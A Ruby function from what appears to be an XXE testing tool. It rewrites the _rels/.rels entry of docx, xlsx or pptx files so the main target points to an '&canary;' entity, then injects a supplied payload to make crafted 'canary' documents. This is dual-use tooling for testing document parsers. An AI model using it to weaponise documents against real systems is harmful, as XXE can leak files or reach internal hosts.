# encoding: ASCII-8BIT
# Create file with simple entity canary2
def entity_canary(fz, payload)
  # grab the ext
  ext = @options['file'].split('.').last
  name = '_rels/.rels'
  document = ''

  # place the payload in different file depending on ext
  if ext == 'docx'
    payload = payload.gsub('fza', 'word/document.xml')

    # Read in the XLSX and grab the file
    Zip::Archive.open(@options['file'], Zip::CREATE) do |zipfile|
      zipfile.fopen(name) do |f|
        document = f.read # read entry content
      end
    end

    #		puts document.gsub(" "," \n")
    replace = 'Target="word/document.xml"'
    replace1 = 'Target="&canary;"'

    document = document.gsub(replace,replace1)
    docx_xml = payload(document,payload)

    nname = "output_#{Time.now.to_i}_#{name.gsub('.', '_').gsub('/', '_')}"
    rand_file = "./output/canary_#{nname}.#{ext}"

    puts "|+| Creating #{rand_file}"
    FileUtils::copy_file(@options['file'], rand_file)
    Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
      zipfile.add_or_replace_buffer(name, docx_xml)
    end

  elsif ext == 'xlsx'
    payload = payload.gsub('fza', 'xl/workbook.xml')

    # Read in the XLSX and grab the file
    Zip::Archive.open(@options['file'], Zip::CREATE) do |zipfile|
      zipfile.fopen(name) do |f|
        document = f.read # read entry content
      end
    end

    #		puts document.gsub(" "," \n")
    replace = 'Target="xl/workbook.xml"'
    replace1 = 'Target="&canary;"'

    document = document.gsub(replace,replace1)
    docx_xml = payload(document,payload)

    nname = "output_#{Time.now.to_i}_#{name.gsub('.', '_').gsub('/', '_')}"
    rand_file = "./output/canary_#{nname}.#{ext}"

    puts "|+| Creating #{rand_file}"
    FileUtils::copy_file(@options['file'], rand_file)
    Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
      zipfile.add_or_replace_buffer(name, docx_xml)
    end
  else
    payload = payload.gsub('fza', 'ppt/presentation.xml')

    # Read in the XLSX and grab the file
    Zip::Archive.open(@options['file'], Zip::CREATE) do |zipfile|
      zipfile.fopen(name) do |f|
        document = f.read # read entry content
      end
    end

    #		puts document.gsub(" "," \n")
    replace = 'Target="ppt/presentation.xml"'
    replace1 = 'Target="&canary;"'

    document = document.gsub(replace,replace1)
    docx_xml = payload(document,payload)

    nname = "output_#{Time.now.to_i}_#{name.gsub('.', '_').gsub('/', '_')}"
    rand_file = "./output/canary_#{nname}.#{ext}"

    puts "|+| Creating #{rand_file}"
    FileUtils::copy_file(@options['file'], rand_file)
    Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
      zipfile.add_or_replace_buffer(name, docx_xml)
    end
  end

end